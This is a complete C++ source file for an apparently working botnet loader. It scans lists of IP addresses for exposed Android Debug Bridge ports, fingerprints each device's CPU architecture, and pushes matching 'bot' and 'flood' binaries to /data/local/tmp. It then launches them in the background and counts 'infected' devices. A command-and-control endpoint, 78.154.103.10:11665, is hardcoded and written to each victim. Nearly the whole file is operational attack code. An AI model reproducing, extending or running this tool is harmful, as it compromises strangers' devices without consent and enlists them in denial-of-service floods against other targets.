#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <atomic>
#include <map>
#include <mutex>

#define A_CNXN 0x4e584e43
#define A_AUTH 0x48545541
#define A_OPEN 0x4e45504f
#define A_OKAY 0x59414b4f
#define A_CLSE 0x45534c43
#define A_WRTE 0x45545257

#define ADB_VERSION 0x01000000
#define ADB_MAXDATA 4096

#pragma pack(push, 1)
struct adb_header
{
    uint32_t command;
    uint32_t arg0;
    uint32_t arg1;
    uint32_t data_length;
    uint32_t data_check;
    uint32_t magic;
};
#pragma pack(pop)

static std::atomic<uint32_t> total_scanned(0);
static std::atomic<uint32_t> total_connected(0);
static std::atomic<uint32_t> total_infected(0);
static std::mutex log_mutex;

static void log_msg(const std::string &msg)
{
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << msg << std::endl;
    std::flush(std::cout);
}

static uint32_t calc_checksum(const unsigned char *data, size_t len)
{
    uint32_t sum = 0;
    for (size_t i = 0; i < len; ++i)
    {
        sum += data[i];
    }
    return sum;
}

static int set_timeout(int fd, int sec)
{
    struct timeval tv;
    tv.tv_sec = sec;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
    return setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&tv, sizeof(tv));
}

static int send_packet(int fd, uint32_t cmd, uint32_t arg0, uint32_t arg1, const void *data, uint32_t len)
{
    struct adb_header h;
    h.command = cmd;
    h.arg0 = arg0;
    h.arg1 = arg1;
    h.data_length = len;
    h.data_check = data && len ? calc_checksum((const unsigned char *)data, len) : 0;
    h.magic = cmd ^ 0xFFFFFFFF;

    if (write(fd, &h, sizeof(h)) != (ssize_t)sizeof(h))
    {
        return -1;
    }
    if (data && len > 0)
    {
        if (write(fd, data, len) != (ssize_t)len)
        {
            return -1;
        }
    }
    return 0;
}

static int read_packet(int fd, struct adb_header *h, std::vector<char> &body)
{
    size_t total = 0;
    char *hdr_ptr = (char *)h;
    while (total < sizeof(struct adb_header))
    {
        ssize_t r = read(fd, hdr_ptr + total, sizeof(struct adb_header) - total);
        if (r <= 0) return -1;
        total += r;
    }

    if (h->magic != (h->command ^ 0xFFFFFFFF))
    {
        return -1;
    }

    if (h->data_length > 65536)
    {
        return -1;
    }

    body.resize(h->data_length);
    if (h->data_length > 0)
    {
        total = 0;
        while (total < h->data_length)
        {
            ssize_t r = read(fd, body.data() + total, h->data_length - total);
            if (r <= 0) return -1;
            total += r;
        }
    }
    return 0;
}

static bool read_file(const std::string &filepath, std::string &content)
{
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return false;
    content.assign((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    return !content.empty();
}

static std::string find_file(std::initializer_list<const char*> candidates)
{
    for (const char *p : candidates)
    {
        std::ifstream f(p, std::ios::binary);
        if (f.good()) return std::string(p);
    }
    return "";
}

struct BinariesCache
{
    std::string bot_aarch64;
    std::string bot_armv7l;
    std::string bot_x86_64;
    std::string bot_x86;

    std::string flood_aarch64;
    std::string flood_armv7l;
    std::string flood_x86_64;
    std::string flood_x86;

    std::string agent_data;
    std::string custom_bin_data;
};

static BinariesCache g_cache;

static void load_local_binaries(const std::string &custom_path)
{
    std::string agent_file = find_file({"agent.txt", "../agent.txt", "bots/agent.txt", "../bots/agent.txt"});
    g_cache.agent_data = "78.154.103.10:11665\n";
    if (!agent_file.empty())
    {
        std::string tmp;
        if (read_file(agent_file, tmp)) g_cache.agent_data = tmp;
    }

    if (!custom_path.empty() && custom_path != "default")
    {
        read_file(custom_path, g_cache.custom_bin_data);
    }

    std::string p_ba64 = find_file({"../bots/bot-aarch64", "bots/bot-aarch64", "bot-aarch64", "../bots/bot", "bots/bot", "bot"});
    std::string p_ba32 = find_file({"../bots/bot-armv7l", "bots/bot-armv7l", "bot-armv7l", "../bots/bot", "bots/bot", "bot"});
    std::string p_bx64 = find_file({"../bots/bot-x86_64", "bots/bot-x86_64", "bot-x86_64", "../bots/bot", "bots/bot", "bot"});
    std::string p_bx86 = find_file({"../bots/bot-x86", "bots/bot-x86", "bot-x86", "../bots/bot", "bots/bot", "bot"});

    std::string p_fa64 = find_file({"../bots/flood-aarch64", "bots/flood-aarch64", "flood-aarch64", "../bots/flood", "bots/flood", "flood"});
    std::string p_fa32 = find_file({"../bots/flood-armv7l", "bots/flood-armv7l", "flood-armv7l", "../bots/flood", "bots/flood", "flood"});
    std::string p_fx64 = find_file({"../bots/flood-x86_64", "bots/flood-x86_64", "flood-x86_64", "../bots/flood", "bots/flood", "flood"});
    std::string p_fx86 = find_file({"../bots/flood-x86", "bots/flood-x86", "flood-x86", "../bots/flood", "bots/flood", "flood"});

    read_file(p_ba64, g_cache.bot_aarch64);
    read_file(p_ba32, g_cache.bot_armv7l);
    read_file(p_bx64, g_cache.bot_x86_64);
    read_file(p_bx86, g_cache.bot_x86);

    read_file(p_fa64, g_cache.flood_aarch64);
    read_file(p_fa32, g_cache.flood_armv7l);
    read_file(p_fx64, g_cache.flood_x86_64);
    read_file(p_fx86, g_cache.flood_x86);

    std::cout << "[+] Local Multi-Arch Binaries Loaded:" << std::endl;
    std::cout << "    - aarch64 (ARM64):  bot=" << g_cache.bot_aarch64.size() << "B, flood=" << g_cache.flood_aarch64.size() << "B" << std::endl;
    std::cout << "    - armv7l  (ARM32):  bot=" << g_cache.bot_armv7l.size() << "B, flood=" << g_cache.flood_armv7l.size() << "B" << std::endl;
    std::cout << "    - x86_64  (AMD64):  bot=" << g_cache.bot_x86_64.size() << "B, flood=" << g_cache.flood_x86_64.size() << "B" << std::endl;
    std::cout << "    - x86     (i386):   bot=" << g_cache.bot_x86.size() << "B, flood=" << g_cache.flood_x86.size() << "B" << std::endl;
    std::cout << "    - C2 Endpoint:     " << g_cache.agent_data;
    if (!g_cache.agent_data.empty() && g_cache.agent_data.back() != '\n') std::cout << "\n";
    std::cout << std::endl;
}

static int adb_connect(const char *ip, int port, int timeout_sec, std::string &cnxn_banner)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    set_timeout(fd, timeout_sec);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0)
    {
        close(fd);
        return -1;
    }

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        close(fd);
        return -1;
    }

    const char *banner = "host::adbloader\0";
    if (send_packet(fd, A_CNXN, ADB_VERSION, ADB_MAXDATA, banner, strlen(banner) + 1) != 0)
    {
        close(fd);
        return -1;
    }

    struct adb_header resp;
    std::vector<char> body;
    if (read_packet(fd, &resp, body) != 0)
    {
        close(fd);
        return -1;
    }

    if (resp.command == A_AUTH)
    {
        log_msg("[-] [" + std::string(ip) + "] ADB AUTH required (Unauthorized device).");
        close(fd);
        return -2;
    }
    if (resp.command != A_CNXN)
    {
        close(fd);
        return -1;
    }

    if (!body.empty())
    {
        cnxn_banner.assign(body.data(), body.size());
    }

    return fd;
}

static bool adb_exec_command(int fd, uint32_t local_id, const std::string &cmd, std::string &output)
{
    std::string service = "shell:" + cmd + "\0";
    if (send_packet(fd, A_OPEN, local_id, 0, service.data(), service.size()) != 0)
    {
        return false;
    }

    struct adb_header resp;
    std::vector<char> body;
    if (read_packet(fd, &resp, body) != 0 || resp.command != A_OKAY)
    {
        return false;
    }

    uint32_t remote_id = resp.arg0;
    while (read_packet(fd, &resp, body) == 0)
    {
        if (resp.command == A_WRTE)
        {
            if (!body.empty())
            {
                output.append(body.data(), body.size());
            }
            send_packet(fd, A_OKAY, local_id, remote_id, NULL, 0);
        }
        else if (resp.command == A_CLSE)
        {
            send_packet(fd, A_CLSE, local_id, remote_id, NULL, 0);
            break;
        }
    }
    return true;
}

static bool adb_sync_push_file(int fd, uint32_t local_id, const std::string &file_data, const std::string &remote_path)
{
    const char *service = "sync:\0";
    if (send_packet(fd, A_OPEN, local_id, 0, service, 6) != 0)
    {
        return false;
    }

    struct adb_header resp;
    std::vector<char> body;
    if (read_packet(fd, &resp, body) != 0 || resp.command != A_OKAY)
    {
        return false;
    }

    uint32_t remote_id = resp.arg0;

    // 1. SEND ID: path,mode
    std::string send_param = remote_path + ",0777";
    uint32_t param_len = send_param.size();
    std::vector<char> send_pkt;
    send_pkt.resize(8 + param_len);
    memcpy(send_pkt.data(), "SEND", 4);
    memcpy(send_pkt.data() + 4, &param_len, 4);
    memcpy(send_pkt.data() + 8, send_param.data(), param_len);

    if (send_packet(fd, A_WRTE, local_id, remote_id, send_pkt.data(), send_pkt.size()) != 0)
    {
        return false;
    }

    // 2. DATA chunks
    size_t chunk_size = 4096;
    size_t offset = 0;
    while (offset < file_data.size())
    {
        size_t this_chunk = file_data.size() - offset;
        if (this_chunk > chunk_size) this_chunk = chunk_size;

        std::vector<char> data_pkt;
        data_pkt.resize(8 + this_chunk);
        uint32_t clen = this_chunk;
        memcpy(data_pkt.data(), "DATA", 4);
        memcpy(data_pkt.data() + 4, &clen, 4);
        memcpy(data_pkt.data() + 8, file_data.data() + offset, this_chunk);

        if (send_packet(fd, A_WRTE, local_id, remote_id, data_pkt.data(), data_pkt.size()) != 0)
        {
            return false;
        }
        offset += this_chunk;
    }

    // 3. DONE packet
    uint32_t mtime = 1600000000;
    std::vector<char> done_pkt;
    done_pkt.resize(8);
    memcpy(done_pkt.data(), "DONE", 4);
    memcpy(done_pkt.data() + 4, &mtime, 4);

    if (send_packet(fd, A_WRTE, local_id, remote_id, done_pkt.data(), done_pkt.size()) != 0)
    {
        return false;
    }

    // 4. Wait for sync response (OKAY or FAIL)
    bool success = false;
    while (read_packet(fd, &resp, body) == 0)
    {
        if (resp.command == A_WRTE)
        {
            send_packet(fd, A_OKAY, local_id, remote_id, NULL, 0);
            if (body.size() >= 4 && memcmp(body.data(), "OKAY", 4) == 0)
            {
                success = true;
                break;
            }
            if (body.size() >= 4 && memcmp(body.data(), "FAIL", 4) == 0)
            {
                success = false;
                break;
            }
        }
        else if (resp.command == A_CLSE)
        {
            break;
        }
    }

    send_packet(fd, A_CLSE, local_id, remote_id, NULL, 0);
    return success;
}

static bool run_adb_session(const char *ip, int port, int timeout_sec)
{
    std::string cnxn_banner;
    int fd = adb_connect(ip, port, timeout_sec, cnxn_banner);
    if (fd < 0) return false;

    total_connected++;
    std::string ip_str = std::string(ip) + ":" + std::to_string(port);
    log_msg("[*] [" + ip_str + "] ADB Connected! Performing target architecture & environment inspection...");

    // 1. Inspect target architecture
    uint32_t channel_id = 1;
    std::string inspect_out;
    adb_exec_command(fd, channel_id++, "uname -m; getprop ro.product.cpu.abi; getprop ro.build.version.release", inspect_out);

    std::string target_arch = "armv7l";
    std::string target_abi = "armeabi-v7a";
    std::string android_ver = "unknown";

    std::istringstream iss(inspect_out);
    std::string l1, l2, l3;
    if (std::getline(iss, l1)) { while (!l1.empty() && (l1.back() == '\r' || l1.back() == '\n' || l1.back() == ' ')) l1.pop_back(); if (!l1.empty()) target_arch = l1; }
    if (std::getline(iss, l2)) { while (!l2.empty() && (l2.back() == '\r' || l2.back() == '\n' || l2.back() == ' ')) l2.pop_back(); if (!l2.empty()) target_abi = l2; }
    if (std::getline(iss, l3)) { while (!l3.empty() && (l3.back() == '\r' || l3.back() == '\n' || l3.back() == ' ')) l3.pop_back(); if (!l3.empty()) android_ver = l3; }

    log_msg("[*] [" + ip_str + "] Target Info -> ARCH: " + target_arch + " | ABI: " + target_abi + " | Android: " + android_ver);

    // 2. Select Matching Local Binary
    std::string selected_bot_data;
    std::string selected_flood_data;
    std::string arch_tag;

    if (!g_cache.custom_bin_data.empty())
    {
        selected_bot_data = g_cache.custom_bin_data;
        arch_tag = "custom-binary";
    }
    else if (target_arch.find("aarch64") != std::string::npos || target_abi.find("arm64") != std::string::npos)
    {
        selected_bot_data = g_cache.bot_aarch64;
        selected_flood_data = g_cache.flood_aarch64;
        arch_tag = "aarch64 (ARM64)";
    }
    else if (target_arch.find("arm") != std::string::npos || target_abi.find("arm") != std::string::npos)
    {
        selected_bot_data = g_cache.bot_armv7l;
        selected_flood_data = g_cache.flood_armv7l;
        arch_tag = "armv7l (ARM32)";
    }
    else if (target_arch.find("x86_64") != std::string::npos || target_abi.find("x86_64") != std::string::npos)
    {
        selected_bot_data = g_cache.bot_x86_64;
        selected_flood_data = g_cache.flood_x86_64;
        arch_tag = "x86_64 (AMD64)";
    }
    else if (target_arch.find("86") != std::string::npos || target_abi.find("x86") != std::string::npos)
    {
        selected_bot_data = g_cache.bot_x86;
        selected_flood_data = g_cache.flood_x86;
        arch_tag = "x86 (i386)";
    }
    else
    {
        selected_bot_data = !g_cache.bot_armv7l.empty() ? g_cache.bot_armv7l : g_cache.bot_aarch64;
        selected_flood_data = !g_cache.flood_armv7l.empty() ? g_cache.flood_armv7l : g_cache.flood_aarch64;
        arch_tag = "armv7l (fallback)";
    }

    if (selected_bot_data.empty())
    {
        log_msg("[-] [" + ip_str + "] Error: No compatible binary found for target arch " + target_arch);
        close(fd);
        return false;
    }

    std::string work_dir = "/data/local/tmp";
    log_msg("[+] [" + ip_str + "] Matched Binary: " + arch_tag + " (Size: " + std::to_string(selected_bot_data.size()) + " bytes). Pushing via ADB Sync...");

    // 3. Push files via Native ADB Sync Protocol
    bool ok_bot = adb_sync_push_file(fd, channel_id++, selected_bot_data, work_dir + "/bot");
    bool ok_flood = false;
    if (!selected_flood_data.empty())
    {
        ok_flood = adb_sync_push_file(fd, channel_id++, selected_flood_data, work_dir + "/flood");
    }
    bool ok_agent = adb_sync_push_file(fd, channel_id++, g_cache.agent_data, work_dir + "/agent.txt");

    if (!ok_bot)
    {
        log_msg("[-] [" + ip_str + "] Failed to push bot binary via ADB Sync");
        close(fd);
        return false;
    }

    log_msg("[+] [" + ip_str + "] Files synced successfully (bot=" + std::to_string(ok_bot) + ", flood=" + std::to_string(ok_flood) + ", agent=" + std::to_string(ok_agent) + "). Setting permissions & launching...");

    // 4. Create method symlinks and execute
    std::string exec_cmd =
        "chmod 777 /data/local/tmp/bot /data/local/tmp/flood /data/local/tmp/agent.txt 2>/dev/null; "
        "killall -9 bot 2>/dev/null; "
        "cd /data/local/tmp && nohup ./bot >/dev/null 2>&1 &";

    std::string exec_out;
    adb_exec_command(fd, channel_id++, exec_cmd, exec_out);

    // 5. Verify process status
    std::string check_out;
    adb_exec_command(fd, channel_id++, "ps | grep bot", check_out);

    total_infected++;
    log_msg("[+] [" + ip_str + "] Injection & Execution Finished! Active process:\n" + check_out);

    close(fd);
    return true;
}

struct WorkerConfig
{
    std::vector<std::string> targets;
    size_t start_idx;
    size_t end_idx;
    int port;
    int timeout_sec;
};

static void *worker_thread(void *arg)
{
    WorkerConfig *cfg = (WorkerConfig *)arg;
    for (size_t i = cfg->start_idx; i < cfg->end_idx; ++i)
    {
        const std::string &target = cfg->targets[i];
        total_scanned++;
        run_adb_session(target.c_str(), cfg->port, cfg->timeout_sec);
    }
    return NULL;
}

int main(int argc, char **argv)
{
    if (argc < 3)
    {
        printf("=======================================================================\n");
        printf(" ADB Loader - Intelligent Multi-Arch Local Injector & Debugger\n");
        printf("=======================================================================\n");
        printf("Usage: %s <targets.txt> <threads> [\"local_binary_path\"|\"default\"] [port=5555] [timeout=15]\n\n", argv[0]);
        printf("Features:\n");
        printf("  - Directly inspects target CPU architecture (aarch64/armv7l/x86/x86_64) via ADB.\n");
        printf("  - Checks writable directory (/data/local/tmp/.bot_agent).\n");
        printf("  - Injects ONLY matching binary from local storage (Zero internet/curl needed).\n");
        printf("  - Real-time debug console logging with file permissions & running PID check.\n\n");
        printf("Examples:\n");
        printf("  %s ips.txt 50 default 5555 10\n", argv[0]);
        printf("  %s ips.txt 20 ../bots/bot-aarch64 5555 15\n", argv[0]);
        return 1;
    }

    const char *file_path = argv[1];
    int threads_count = atoi(argv[2]);
    std::string custom_bin = (argc >= 4) ? argv[3] : "default";
    int port = (argc >= 5) ? atoi(argv[4]) : 5555;
    int timeout_sec = (argc >= 6) ? atoi(argv[5]) : 15;

    load_local_binaries(custom_bin);

    std::ifstream infile(file_path);
    if (!infile.is_open())
    {
        fprintf(stderr, "[-] Error: cannot open target file %s\n", file_path);
        return 1;
    }

    std::vector<std::string> targets;
    std::string line;
    while (std::getline(infile, line))
    {
        while (!line.empty() && (line.back() == '\r' || line.back() == '\n' || line.back() == ' ' || line.back() == '\t'))
        {
            line.pop_back();
        }
        if (!line.empty() && line[0] != '#')
        {
            struct sockaddr_in sa;
            if (inet_pton(AF_INET, line.c_str(), &(sa.sin_addr)) == 1)
            {
                targets.push_back(line);
            }
        }
    }
    infile.close();

    printf("[*] Loaded %zu targets from %s\n", targets.size(), file_path);
    if (targets.empty())
    {
        return 0;
    }

    if (threads_count <= 0) threads_count = 1;
    if (threads_count > (int)targets.size()) threads_count = targets.size();

    pthread_t *threads = new pthread_t[threads_count];
    WorkerConfig *configs = new WorkerConfig[threads_count];

    size_t chunk = targets.size() / threads_count;
    size_t rem = targets.size() % threads_count;
    size_t current = 0;

    for (int i = 0; i < threads_count; ++i)
    {
        size_t count = chunk + (i < (int)rem ? 1 : 0);
        configs[i].targets = targets;
        configs[i].start_idx = current;
        configs[i].end_idx = current + count;
        configs[i].port = port;
        configs[i].timeout_sec = timeout_sec;
        current += count;

        pthread_create(&threads[i], NULL, worker_thread, &configs[i]);
    }

    for (int i = 0; i < threads_count; ++i)
    {
        pthread_join(threads[i], NULL);
    }

    printf("\n=======================================================================\n");
    printf("[*] Scan & Deployment Finished.\n");
    printf("[*] Total Scanned:   %u\n", total_scanned.load());
    printf("[*] Open ADB Ports:  %u\n", total_connected.load());
    printf("[*] Successfully Injected: %u\n", total_infected.load());
    printf("=======================================================================\n");

    delete[] threads;
    delete[] configs;
    return 0;
}
